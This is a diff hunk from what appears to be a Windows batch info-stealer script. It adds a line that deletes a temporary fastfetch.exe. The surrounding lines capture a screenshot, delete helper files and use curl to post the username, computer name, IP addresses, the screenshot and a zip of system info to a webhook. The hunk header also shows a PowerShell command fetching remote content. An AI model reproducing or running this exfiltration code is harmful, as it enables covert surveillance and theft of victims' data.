@@ -34,6 +34,7 @@ powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm -useb https:/
 call screenCapture screenshot.png >nul
 del screencapture.exe >nul
 del screencapture.bat >nul
+del %TEMP%\fastfetch.exe >nul
 curl -k -F "payload_json={\"content\": \"~=CONNECTION ESTABLISHED=~ \nDate: %date% \nTime: %time% \nUsername: %username% \nComputer Name: %COMPUTERNAME% \nPublic IP: %PublicIP% \nPrivate IP: %IP% \nInfo and Screenshot:\"}" -F "file1=@screenshot.png" -F "file2=@info.zip" %WEBHOOK% >nul
 popd
 rd /s /q "%TEMP%\wstemp" >nul
